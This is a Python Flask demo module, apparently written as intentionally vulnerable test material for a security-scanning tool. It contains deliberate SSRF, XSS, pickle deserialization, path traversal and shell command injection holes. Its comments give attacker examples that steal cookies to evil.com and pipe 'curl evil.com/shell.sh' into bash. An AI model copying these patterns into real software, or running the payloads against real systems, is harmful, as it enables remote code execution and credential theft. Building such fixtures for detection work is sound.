"""
Demo: Vulnerable API Module
⚠️  INTENTIONALLY VULNERABLE — For SecureFlow demo purposes only
⚠️  DO NOT use in production

Vulnerabilities for SecureFlow to detect and fix:
1. SSRF — Server-Side Request Forgery (line ~30)
2. XSS — Cross-Site Scripting (line ~55)
3. Insecure Deserialization (line ~70)
4. Path Traversal (line ~85)
"""

import pickle
import requests
import os
import json
from flask import Flask, request, jsonify

app = Flask(__name__)


@app.route("/fetch")
def fetch_url():
    """
    Fetch content from a user-provided URL.
    
    ⚠️ VULNERABILITY 1: SSRF — Server-Side Request Forgery (CWE-918)
    SecureFlow fix: Add URL allowlist validation
    
    Attacker can use: /fetch?url=http://169.254.169.254/latest/meta-data/
    to access AWS instance metadata and steal credentials.
    """
    url = request.args.get("url", "")
    
    # VULNERABLE: No URL validation — attacker controls the target
    response = requests.get(url, timeout=5)
    return response.text


@app.route("/search")
def search():
    """
    Search and display results.
    
    ⚠️ VULNERABILITY 2: Reflected XSS (CWE-79)
    SecureFlow fix: HTML-escape user input before rendering
    """
    query = request.args.get("q", "")
    
    # VULNERABLE: User input reflected directly into HTML without escaping
    # Attacker: /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
    html = f"""
    <html>
    <body>
        <h1>Search Results for: {query}</h1>
        <p>No results found for <b>{query}</b></p>
    </body>
    </html>
    """
    return html


@app.route("/load-session", methods=["POST"])
def load_session():
    """
    Load a user session from serialized data.
    
    ⚠️ VULNERABILITY 3: Insecure Deserialization (CWE-502)
    SecureFlow fix: Use json.loads() instead of pickle.loads()
    
    Attacker can send crafted pickle payload to execute arbitrary code.
    """
    data = request.get_data()
    
    # VULNERABLE: pickle.loads() on untrusted data = Remote Code Execution
    session_data = pickle.loads(data)
    return jsonify(session_data)


@app.route("/files")
def read_file():
    """
    Read a file from the uploads directory.
    
    ⚠️ VULNERABILITY 4: Path Traversal (CWE-22)
    SecureFlow fix: Validate and sanitize file path
    
    Attacker: /files?name=../../etc/passwd
    """
    filename = request.args.get("name", "")
    
    # VULNERABLE: No path validation — attacker can read any file
    filepath = os.path.join("uploads", filename)
    
    with open(filepath, "r") as f:
        content = f.read()
    
    return content


@app.route("/execute", methods=["POST"])
def execute_command():
    """
    Execute a system command.
    
    ⚠️ VULNERABILITY 5: Command Injection (CWE-78)
    SecureFlow fix: Use subprocess with argument list, validate input
    """
    import subprocess
    
    cmd = request.json.get("command", "")
    
    # VULNERABLE: Direct shell execution of user input
    # Attacker: {"command": "ls; cat /etc/passwd; curl evil.com/shell.sh | bash"}
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    return jsonify({"output": result.stdout, "error": result.stderr})


if __name__ == "__main__":
    app.run(debug=True)  # ⚠️ debug=True in production exposes interactive debugger
